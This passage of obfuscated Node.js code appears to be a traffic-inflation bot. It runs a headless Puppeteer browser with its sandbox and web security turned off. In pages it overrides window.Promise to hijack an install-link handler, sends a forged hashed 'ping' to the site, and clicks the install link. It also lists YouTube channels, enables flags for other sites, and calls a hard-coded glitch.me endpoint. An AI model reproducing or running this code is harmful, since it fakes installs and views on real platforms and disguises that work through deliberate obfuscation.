0x994 * -0x5] = this['bytes'] << 0x1 * -0x116f + 0xd * -0x1c9 + 0x28a7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1e3d + 0x1d3 * 0x9 + 0x1 * 0xde2; J < 0x1ab4 + 0x1349 + -0x2dad; ++J)
                K = Q[J - (0x1 * -0x13f9 + -0x210a + 0x269 * 0x16)] ^ Q[J - (0x1 * 0x1738 + 0xc88 + -0x18 * 0x17d)] ^ Q[J - (-0xcfb * 0x3 + -0x1d91 + 0x4490)] ^ Q[J - (-0x19a0 + -0x545 * 0x7 + 0x3e93)], Q[J] = K << 0x206a + -0x5f9 + 0x12 * -0x178 | K >>> -0x1d84 + -0x1e28 + 0x3bcb * 0x1;
              for (J = -0x2106 + -0x1 * 0x2e7 + 0x23ed; J < 0x109 + -0x32 * -0x1f + 0x1 * -0x703; J += -0x1 * 0x247 + 0xe9c + -0x314 * 0x4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x6ee * -0x2 + 0x1d42 + -0x7f * 0x1f | L >>> 0x22d + 0x1 * -0x1c2b + 0x1a19) + (M & N | ~M & O) + P + (-0x16e150fc + -0x1274b39f * -0x5 + -0x384b6bf * -0x6) + Q[J] << 0x997 + 0x4f * 0x6a + -0x2a4d) << 0x1 * 0x205f + -0x1377 + -0xce3 | P >>> 0x1765 + 0x3b * 0x56 + -0x2b1c) + (L & (M = M << -0x25b * 0x9 + 0x150f + 0x42 | M >>> 0x24e + -0x1c87 + 0x11 * 0x18b) | ~L & N) + O + (0x835de5ec + 0x60989e2d + -0x89740a80) + Q[J + (-0x1 * -0x1082 + -0xe4f + -0x232)] << 0x1f * 0x96 + -0x59 * 0xe + 0x17 * -0x94) << -0x1 * -0x1cd + 0x1 * -0x11c5 + -0x1 * -0xffd | O >>> 0x157f * 0x1 + -0x7b0 + -0xdb4 * 0x1) + (P & (L = L << 0x3 * 0x2de + 0xd47 * 0x1 + -0x15c3 | L >>> -0x187 * 0xd + -0x5 * -0x6cd + -0xe24) | ~P & M) + N + (0x2 * 0x15976656 + 0x1 * -0x6b3539c3 + 0x9a88e6b0) + Q[J + (0xd03 * -0x1 + 0x22c9 + -0x15c4)] << 0x1c62 + 0x2090 + -0x3cf2) << 0x202 * 0x5 + -0x2392 + -0x1f * -0xd3 | N >>> 0x871 + 0x22c + 0x10d * -0xa) + (O & (P = P << -0x6b2 * -0x4 + -0x34c * 0x5 + -0xa2e * 0x1 | P >>> 0x1e * -0x1b + 0x156f + -0x11 * 0x113) | ~O & L) + M + (-0x270 * -0x46c1ea + -0xa996ac82 + 0x57a07bbb) + Q[J + (0xcf + 0xb56 + -0xc22)] << 0x1 * -0xd94 + 0x181 * 0x13 + -0xeff) << 0x392 * -0x2 + 0xff5 + -0x8cc | M >>> -0x1027 + 0x3ee + 0x315 * 0x4) + (N & (O = O << 0xe * -0xe3 + 0xe11 + 0x83 * -0x3 | O >>> 0x4f4 * 0x1 + 0x2217 + -0x2709) | ~N & P) + L + (-0x14f24243 + 0x2354fe * 0x4e1 + -0x6 * 0xa277d3b) + Q[J + (0x6de + 0x1c01 + -0x22db)] << -0x134b + 0x153 + 0x11f8, N = N << 0x1 * 0x1a46 + -0x2f9 * 0x8 + -0x260 | N >>> 0x1ba5 + -0x529 * -0x1 + -0x20cc * 0x1;
              for (; J < -0x1bb4 + 0x7a7 + 0x1435; J += 0x53 * 0xb + 0x1 * 0x184d + -0x1bd9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1ea8 + 0x2090 + 0x3f33 * -0x1 | L >>> -0x23b9 + 0xb9d + -0x1 * -0x1837) + (M ^ N ^ O) + P + (0x724aa54a + 0x755404b3 + 0x2 * -0x3c625f2e) + Q[J] << 0x1b17 + -0xcba * 0x3 + 0xb17) << -0x177e + -0x1 * -0x2421 + -0xc9e | P >>> -0x1bff + -0x1d * -0xda + 0x368) + (L ^ (M = M << 0xaaf + 0x71 * 0x2b + -0x1d8c | M >>> -0xeac + 0x1 * -0x1ca4 + -0x5 * -0x8aa) ^ N) + O + (0xc0f8364 + -0x4413f913 + 0xa6de6150) + Q[J + (0x236 + -0xe * 0x2b6 + 0x1 * 0x23bf)] << 0x1 * 0x1c6a + -0x1fdd + 0x373) << 0x1a + 0x1084 + -0x25f * 0x7 | O >>> -0x1 * -0x1bc5 + -0xa5 * 0xd + 0x1 * -0x1349) + (P ^ (L = L << -0xe5 + -0x34b * 0x1 + -0x227 * -0x2 | L >>> 0xf10 + 0x1734 + -0x2642) ^ M) + N + (-0x7eec * 0xd89c + -0x6712dab6 + 0x141513e27) + Q[J + (-0x11 * 0x9a + 0x8 * 0x38f + 0x30a * -0x6)] << 0xba6 + -0x1b9b + 0x2b * 0x5f) << 0x24d5 + 0x1 * -0x7f7 + -0x5c5 * 0x5 | N >>> -0x1 * 0x1c37 + -0x2 * 0x4c1 + 0x975 * 0x4) + (O ^ (P = P << -0xa59 * -0x1 + 0x1ecb + -0x2 * 0x1483 | P >>> -0x1688 + 0x27 * -0x41 + 0x2071) ^ L) + M + (0xc88315d8 * 0x1 + 0x178d8a71 + 0x5 * -0x16a48a88) + Q[J + (0x26bd + 0x3d3 * 0x1 + -0x1 * 0x2a8d)] << 0x12a3 + -0x2 * -0x9fd + 0xf * -0x293) << 0x2f7 + -0x1c02 + 0x2 * 0xc88 | M >>> 0x1 * -0xa2b + 0xc6d + 0x1d * -0x13) + (N ^ (O = O << 0x4 * -0x301 + 0x966 + 0x64 * 0x7 | O >>> -0x67 * -0x3 + -0x1d15 * -0x1 + 0x4 * -0x792) ^ P) + L + (-0x4e3ac0 * -0x52 + -0x2dba1246 + -0x51 * -0x19fab37) + Q[J + (-0x2248 + 0x2f9 + -0x37b * -0x9)] << 0x51f + -0xd09 + -0x7ea * -0x1, N = N << -0x7 * -0x3f3 + 0x15e1 + -0x3168 | N >>> -0x3 * 0xad8 + -0x140a + -0xa * -0x542;
              for (; J < -0x25 * 0x42 + 0x37 * -0x74 + 0x22b2; J += 0x17f5 * -0x1 + 0x8d * 0x23 + 0x4b3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6f5 * 0x3 + 0x6e2 * -0x1 + 0x2c7 * 0xa | L >>> -0x22 * -0x9f + -0xedc + 0xe1 * -0x7) + (M & N | M & O | N & O) + P - (-0x64f6ab2e + -0x7d9ad0f1 + 0x15375bf43) + Q[J] << -0x15c3 * -0x1 + 0x11f2 + -0x27b5) << 0x7af * 0x1 + 0x210d + 0x28b7 * -0x1 | P >>> -0x116 + 0x1653 + -0x1 * 0x1522) + (L & (M = M << -0xc * -0x261 + -0x2 * 0xe84 + 0x9a | M >>> 0xa7f + -0x1 * -0xb73 + -0x1a * 0xd8) | L & N | M & N) + O - (-0x936ea6c4 + -0x5d436636 + 0x16196501e) + Q[J + (0x1b54 + -0x18b7 + -0x29c)] << -0x1e8e + 0x2cc * -0xc + 0x1d * 0x236) << 0xe8b + -0xd6 * -0x13 + -0x1e68 * 0x1 | O >>> 0x22fb + 0x1 * 0x5ab + -0x288b * 0x1) + (P & (L = L << 0x26a * -0x6 + 0x747 * 0x1 + -0x4b * -0x19 | L >>> -0xea + 0x3 * 0x97f + -0x1 * 0x1b91) | P & M | L & M) + N - (-0xe3b * 0xbba37 + -0x1369d126 * -0x2 + 0xf0f38d85) + Q[J + (-0x17 * -0xb2 + -0x4 * -0x35b + -0x2 * 0xeb4)] << -0x7 * -0x307 + -0x9ea + -0xb47) << 0xf3d + -0x1 * -0x692 + -0x1 * 0x15ca | N >>> 0x1 * 0xfbd + 0x23 * 0xc2 + 0x26 * -0x11c) + (O & (P = P << -0x14cd + 0x1 * 0x7db + -0x4c * -0x2c | P >>> -0x8 * 0x231 + 0x1 * -0x3bf + -0x1 * -0x1549) | O & L | P & L) + M - (-0x8c9837f7 + 0x78d8db72 + 0x84a39fa9) + Q[J + (0x8 + -0x1b09 + 0xd82 * 0x2)] << 0x196a + 0x2e + 0x888 * -0x3) << 0xd * 0x5e + 0x75 * -0x52 + -0x1 * -0x20b9 | M >>> 0x10 * 0x259 + -0xc * 0x1c6 + -0x29 * 0x65) + (N & (O = O << 0x171a + 0x1b21 * 0x1 + -0x321d * 0x1 | O >>> -0x4b9 + 0x419 * 0x8 + 0x1c0d * -0x1) | N & P | O & P) + L - (-0x61658b73 * -0x1 + -0x1 * 0x58f2c60d + 0x2 * 0x3438bedf) + Q[J + (-0x2e5 + 0x21 * -0xc + -0x475 * -0x1)] << -0x202d + -0x4 * -0x27 + 0x1f91, N = N << 0x2 * 0x107b + -0xbc + 0x5 * -0x66c | N >>> 0x1 * 0x841 + 0x6a0 + -0xedf;
              for (; J < -0x253f * -0x1 + 0x180b + -0x3cfa; J += 0x1 * -0x10ba + -0xb48 + 0x1c07)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2351 + 0x625 + 0x1d31 | L >>> 0x1c78 + -0x1351 * -0x2 + -0x42ff) + (M ^ N ^ O) + P - (-0x4fa6e501 * 0x1 + -0xc5 * 0x7766bf + -0x193107a * -0x8f) + Q[J] << -0x396 + -0xa * 0xfb + 0xd64) << -0x4e0 + -0x246b + 0x2950 | P >>> 0x11ff + 0xb24 + -0x1d08) + (L ^ (M = M << -0x5 * -0x49b + 0x1c81 * 0x1 + -0x2 * 0x19b5 | M >>> -0x6f0 + 0xa9c + -0x3aa) ^ N) + O - (-0xa1dd188 + -0x16 * 0x1c1c9e3 + -0x7e * -0xd004e6) + Q[J + (0x824 + -0x24 * -0x23 + -0xd0f)] << 0x1041 + -0x3 * 0x419 + -0x3f6) << -0x19e4 + -0x1709 + 0x30f2 | O >>> -0x1 * -0x12d4 + 0x1372 + 0x3 * -0xcb9) + (P ^ (L = L << 0x16 * 0x12e + 0x1 * 0x1305 + 0x2cdb * -0x1 | L >>> 0xdd7 + -0x13c1 + 0x5ec) ^ M) + N - (0x1a3 * -0x1eb2f5 + 0x2ce7 * 0x3ff9 + 0x5ca39f7a) + Q[J + (0x1 * -0x18c1 + -0x16 * -0x1a3 + -0xb3f)] << -0x5d * 0x41 + -0x25 * -0x7a + -0x1 * -0x5fb) << 0x6a * 0x51 + 0x7f * -0x7 + -0xa04 * 0x3 | N >>> -0x357 + -0x1c * -0x115 + 0x1ada * -0x1) + (O ^ (P = P << -0xb31 + -0xed7 + 0x1a26 | P >>> -0x1263 * -0x1 + 0x1c24 + -0x2e85 * 0x1) ^ L) + M - (-0x8 * -0x5512c49 + 0x62 * -0x2997c8 + 0x1afff672) + Q[J + (-0x1b15 + -0x433 + -0x1 * -0x1f4b)] << -0x2084 + 0x2 * -0xfdd + -0x156a * -0x3) << -0x54d + 0x1bb1 + -0x165f | M >>> 0x1d4f + 0xe55 * 0x2 + 0x2 * -0x1cef) + (N ^ (O = O << -0x70b + -0x119 * -0xb + 0x11 * -0x4a | O >>> -0x3ce * -0x3 + -0x26ba + 0x1 * 0x1b52) ^ P) + L - (-0x30a15493 + 0x2b63a887 + -0x3 * -0x139e4e12) + Q[J + (0x1abc + -0x60 + -0x1a58)] << -0x1245 + 0x1 * -0x34f + 0x1594, N = N << 0x1ac4 + 0xa3 * 0x7 + -0x1f1b | N >>> 0x1 * 0x791 + 0x2396 * 0x1 + 0x8a1 * -0x5;
              this['h0'] = this['h0'] + L << 0x112e + -0xed4 + -0x7 * 0x56, this['h1'] = this['h1'] + M << -0x1394 * 0x1 + 0xeb1 + 0x9 * 0x8b, this['h2'] = this['h2'] + N << -0x11f3 + 0x55 * 0x3 + 0x10f4, this['h3'] = this['h3'] + O << -0x3 * -0x5b1 + -0x19c1 + -0xb * -0xca, this['h4'] = this['h4'] + P << -0x1276 + -0x1e4c + 0x30c2 * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1426 * 0x1 + -0x1c71 + 0x867 & 0x1d * 0x35 + -0x3 * -0xc47 + 0xe9 * -0x2f] + w[J >> 0x1f15 + 0xb * 0x116 + -0x2aef & -0xd3 * -0x1 + -0x22cd + 0x2209] + w[J >> 0xd40 * -0x2 + 0x1cf3 * -0x1 + 0x3787 & 0x1 * 0x1eaf + 0x1 * 0x1ad5 + -0x1 * 0x3975] + w[J >> -0x2513 + -0x1d8a + -0xa9 * -0x65 & -0x10c2 + 0xe1 * 0x5 + 0xc6c] + w[J >> -0x1 * 0x3d7 + 0x17 * 0x17d + 0x796 * -0x4 & 0x94f * -0x3 + -0xd * 0x26b + 0x3b6b] + w[J >> -0x5db * -0x2 + -0x45 + -0xb69 & -0x5f * 0x26 + 0xe57 + -0x2 * 0x17] + w[J >> -0xb35 + 0x26d2 + 0x9 * -0x311 & 0x13ea * -0x1 + -0x122 + -0x1 * -0x151b] + w[0x17bb + -0xcf5 * 0x2 + 0x2 * 0x11f & J] + w[K >> -0x105 + 0x66 * -0x3 + -0x55 * -0x7 & -0xdb6 + -0x74c + 0x1 * 0x1511] + w[K >> -0x137f + -0x1 * 0x1173 + 0x250a & 0x1 * 0x29d + 0x439 * 0x3 + -0xf39] + w[K >> 0xe02 + -0x69 + -0x1 * 0xd85 & 0x1d2e + -0x6a * 0x19 + 0x12c5 * -0x1] + w[K >> -0xd96 + -0x2339 + 0x30df & 0x6b0 * -0x1 + 0x2012 + -0x1953 * 0x1] + w[K >> 0x215f + -0x93 * -0x1 + -0x21e6 & -0x1dcf + 0xa90 * -0x1 + 0xa * 0x40b] + w[K >> -0x75 * -0x32 + 0xbce + -0x22a0 & -0xc * -0x177 + 0x5 * 0x12e + -0x176b] + w[K >> 0x623 * -0x5 + 0x3de + 0x1ad5 & -0x6 * 0x17e + 0x1fed + 0x1a3 * -0xe] + w[-0x988 + -0x1688 * -0x1 + -0xcf1 * 0x1 & K] + w[L >> -0x2443 + -0x1 * 0x858 + 0x2cb7 & 0x1cc * -0xc + 0x2244 + 0xf9 * -0xd] + w[L >> 0x2621 * -0x1 + 0x128e + 0x13ab & -0x179 * -0x7 + 0xfac * 0x2 + -0x2998] + w[L >> -0x4e7 + -0x19d6 + 0x1ed1 & -0x3cf * -0x5 + -0x2 * -0x1286 + -0xb * 0x518] + w[L >> -0x11f * 0x1f + -0x2 * 0x1069 + 0x5 * 0xd87 & -0x2d * -0x2c + 0x1564 * 0x1 + -0x1d11 * 0x1] + w[L >> -0xc9f * -0x2 + -0x2531 * -0x1 + -0x3e63 & -0x5 * -0x186 + 0x70e + 0x1 * -0xe9d] + w[L >> -0x48 * -0x3b + -0x23e + 0xd * -0x11a & -0x1 * -0xb9d + -0x1e36 + 0x31c * 0x6] + w[L >> -0x77 * -0x31 + 0x1ac5 + -0x3188 & 0x261b + 0x2507 + -0x4b13] + w[-0x7 * -0x451 + 0x45d + 0x1 * -0x2285 & L] + w[M >> 0x1159 * 0x1 + 0x5 * 0x509 + -0x2a6a & -0x399 + -0xcc8 + 0x1070] + w[M >> 0x77a + 0x7 * -0xfb + 0x1 * -0x85 & -0x1 * -0x3a5 + 0x100c + -0x13a2] + w[M >> -0x2523 + -0x11cd + 0x3704 & -0x1127 + 0x2184 + -0x104e] + w[M >> -0x1382 + -0x18 * 0x4 + 0x6f * 0x2e & 0x2643 + -0x3 * 0x6a6 + -0x1242] + w[M >> 0x1dc2 + 0x687 * -0x3 + -0xa21 & -0x1 * 0x5d0 + -0x1197 + 0x1776] + w[M >> -0x489 + -0x1879 + 0x3f * 0x76 & -0x1be2 + 0x13c5 + 0x82c] + w[M >> -0x298 + 0x240b + -0x216f & -0x185a + -0x1f0d + 0x1bbb * 0x2] + w[0x1 * -0x94f + 0x77f + 0x1df * 0x1 & M] + w[N >> 0x2 * -0xa27 + 0x1db8 + -0x94e & 0x23a1 + -0x3d * 0x65 + -0x24d * 0x5] + w[N >> 0x24ed + -0x1bbf + -0x916 & -0x137f + -0x1 * -0x1175 + 0xb3 * 0x3] + w[N >> -0x20d9 + 0x3 * 0x752 + 0xaf7 & -0xbc6 + 0x1 * -0x103f + -0x1 * -0x1c14] + w[N >> -0x1cd6 + -0x1a6d + 0x3753 & -0x5ff + 0x1f93 + -0x1985] + w[N >> 0x116f + -0x13f9 * 0x1 + 0x296 & -0x1 * -0x11d9 + -0x44f * 0x1 + -0xd7b] + w[N >> -0x553 + -0xe * -0x1cd + -0x13db & -0x1a71 + 0x2362 + -0x8e2] + w[N >> -0x1d * 0xaa + -0xb * 0x359 + 0x3819 & -0x1a88 + 0x1caa + -0x213] + w[-0x23b + 0x270e + -0x24c4 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x873 * -0x3 + 0x1e0b + -0x2 * 0x1ba6 & 0x125f + -0xb * 0x277 + -0x33f * -0x3,
                J >> 0x21c7 + -0x18e * 0x4 + 0x1 * -0x1b7f & -0x109a + -0x137 * -0x2 + -0x161 * -0xb,
                J >> -0x5cb * 0x1 + 0x9d * 0x11 + -0x26 * 0x1f & -0xa5e * 0x1 + -0x1bf * -0x9 + -0x45a,
                0x4 * -0x7e2 + -0x1834 + 0x38bb & J,
                K >> 0x180e * -0x1 + 0x1cf9 * 0x1 + -0x4d3 & 0x2 * -0x602 + -0x2459 + 0x315c,
                K >> -0x1 * 0x63f + -0x1a7d + 0x20cc & -0xb * -0x74 + 0xf5f * -0x1 + 0xb62,
                K >> -0x3 * -0x3e7 + 0x1edc + -0x2a89 * 0x1 & -0x13fc + -0x96 + 0x1591 * 0x1,
                0x130e + -0x28b * 0x5 + -0x558 & K,
                L >> -0x1 * 0x3ad + -0xb4d + 0x1 * 0xf12 & -0x2 * -0x472 + 0x24d7 + -0x2cbc,
                L >> 0x1d4e + 0x1d77 + 0x71 * -0x85 & 0x526 + 0x14c * 0x16 + -0x3 * 0xae5,
                L >> 0x43 * -0x17 + 0x2 * 0xa0f + -0xd * 0x115 & 0x29 * 0x92 + 0x1 * -0xbb9 + -0xaaa,
                -0x5 * 0x4a5 + 0x19d0 + -0x198 & L,
                M >> 0x106c + 0xce8 + -0x1 * 0x1d3c & -0x3 * 0x9f3 + 0xe8 * -0x13 + 0x3010,
                M >> 0x1817 + -0x1 * 0xeed + 0x1d2 * -0x5 & -0x235 + -0x2 * 0x7b8 + 0x12a4,
                M >> -0x3 * 0x213 + 0xc8 * 0x17 + -0x1 * 0xbb7 & 0x2024 + -0x2 * 0x335 + -0x1 * 0x18bb,
                -0xef6 + 0xd3c + 0x11 * 0x29 & M,
                N >> 0x1161 + -0x1 * 0x20b6 + -0xb * -0x167 & -0x9ec + -0x2376 * 0x1 + 0x2e61,
                N >> 0x10 * -0xd0 + -0x1 * 0x254d + 0x325d & 0x1 * 0xead + -0x19b3 + 0xc05,
                N >> 0x9e * 0x1b + -0x2332 + -0xb * -0x1b0 & -0xf1f + -0x3 * -0x6fc + -0x4d6,
                -0x2364 + 0x152a + 0xf39 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x955 + -0x31d * 0x3 + 0x40 * 0x4b), (K = new DataView(J))['setUint32'](0x4 * -0x74e + 0x2261 + 0x529 * -0x1, this['h0']), K['setUint32'](0x1129 + -0xbca + -0x3 * 0x1c9, this['h1']), K['setUint32'](0x2665 + 0x1b51 + -0x4b1 * 0xe, this['h2']), K['setUint32'](0xb7b * -0x2 + -0x1d29 + 0x342b, this['h3']), K['setUint32'](0x1 * -0x1cbb + -0x1c2e * -0x1 + -0x9d * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1598 + 0x8cd * 0x1 + -0xccb * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            const V = c;
            let K = -0x169 * -0x3 + -0x1b79 + -0x352 * -0x7;
            J[-0x1870 * 0x1 + 0x1002 + -0x1 * -0x86e]['toString']()[V(0x18)]('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * 0x26c5 + 0x2257 + 0x2 * -0x248e] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2c * -0x76 + 0x7 * -0x4bd + -0x42 * -0x32), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xa0d + 0x1f96 + -0x29a2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xe7f + 0x98 * -0x35 + 0x33d3), Promise['resolve'](0x4c4 + -0x102e * 0x2 + 0x9 * 0x311);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1311 + -0x1418 + 0x107 * 0x1; j < 0x1 * 0x86b + -0x3d * -0x11 + 0x1 * -0xc77; j++)
    i();
}
const NETWORK_PATIENCE = -0x1 * 0x322d + 0x1e7 * -0xa + 0x8b * 0xb9 + (0x1707 + -0x12 * -0x172 + -0x93 * 0x41) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x12bf + -0x8a * 0x2e + 0x308 * 0x2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + W(0x1, '7qFW') + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x12 * -0x1bd + -0x4 * -0x705 + 0x22 * -0x1bf);
    let h = e[f];
    if (b['SJLcnc'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1205 + -0xb24 + -0x6e1, s, t, u = 0x1ee7 + 0xdea * -0x1 + 0x1 * -0x10fd; t = n['charAt'](u++); ~t && (s = r % (0xc8e + -0x239e + 0x1714) ? s * (0x1fe3 * 0x1 + -0x3 * -0x3a0 + 0x2a83 * -0x1) + t : t, r++ % (0xa58 + 0x1 * -0x19fa + 0x1 * 0xfa6)) ? p += String['fromCharCode'](0x1b3a + 0x9 * -0x239 + -0x2 * 0x31d & s >> (-(-0x1 * 0x9bc + 0x3 * 0xc44 + -0x2 * 0xd87) * r & 0x1af2 + -0x225f + 0x1 * 0x773)) : -0x1d7d * -0x1 + -0x1d68 + -0x15) {
          t = o['indexOf'](t);
        }
        for (let v = -0x7 * -0x4d + 0x1901 + -0x1b1c, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x220a + 0x13ab + -0xe6f * -0x1))['slice'](-(-0x24a1 * -0x1 + -0xf8 * 0x1c + -0x97f));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1237 + -0x1 * 0x20ff + 0xec8,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xab6 + 0x2 * 0x3ab + 0x18 * 0x24; u < 0x6ea + 0x1331 + -0x191b * 0x1; u++) {
          p[u] = u;
        }
        for (u = -0x103 * 0x18 + 0xb7 * 0x29 + -0x507; u < 0x2df * -0xd + -0x760 * 0x5 + 0x4b33; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x203d + -0xb7f + 0x2cbc), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x143f + 0x2631 + 0x11f2 * -0x1, q = 0x1 * -0x8c6 + -0x887 * -0x2 + -0x848;
        for (let v = 0x1df * -0x5 + 0x1 * 0x16ed + -0xd92; v < n['length']; v++) {
          u = (u + (0x4d3 + 0x2441 + 0x5 * -0x837)) % (0x1cee + -0xbd8 + -0x1016), q = (q + p[u]) % (-0x23e3 * -0x1 + 0xd8e + -0x3071), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xb02 + -0x39e + 0xfa0)]);
        }
        return t;
      };
      b['CVcpaC'] = m, c = arguments, b['SJLcnc'] = !![];
    }
    const j = e[-0x2104 * -0x1 + -0xcd0 + -0x1434],
      k = f + j,
      l = c[k];
    return !l ? (b['uJrCSo'] === undefined && (b['uJrCSo'] = !![]), h = b['CVcpaC'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function a() {
  const bm = [
    'childNodes',
    'ySkdWO1mWPeFbw8yBW',
    'WQRcKCkTgCkJW7ZcRCkUeqq',
    'Win64;\x20x64',
    'WOToW6JcJCkXWRpdTmk/iSkc',
    'u2fMyxjPlZuZnW',
    'C2XPy2u',
    'zgL1Bs5JB20Vqa',
    'C3r5BguTC2nVCa',
    'Ahr0Chm6lY9Tzq',
    'WQfHWRJdNqaxwhpdT8k5',
    'r1DYmZnFDtbwsW',
    'c2KpW6LAW4dcNCotW43dQq',
    'r/Auto_Loa',
    'WOq+WOnjcfTpWQVcHNa',
    'AMBdLdtcTKhcUmkOqdC',
    'ence-betwe',
    'kv0PFmkfzX4aW7fl',
    'nola/the-c',
    'pts/by-sit',
    'wSOFdefX47',
    'FSo/hmoTicNdPmkZW68X',
    '_[Krunker_',
    'ocumentEle',
    'Aw5JBhvKzxm',
    'rg/en/scri',
    'Safari/537',
    'split',
    'EgjYrfPbrMyZuq',
    'wfDksc02sJvfzq',
    'easyfork.o',
    'pfldSCoLyCoSeSoDW4/dUW',
    'yw5VBNLTB3vZlq'
  ];
  a = function() {
    return bm;
  };
  return a();
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x29c + -0x35 * -0x19 + 0x3 * -0xdb; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
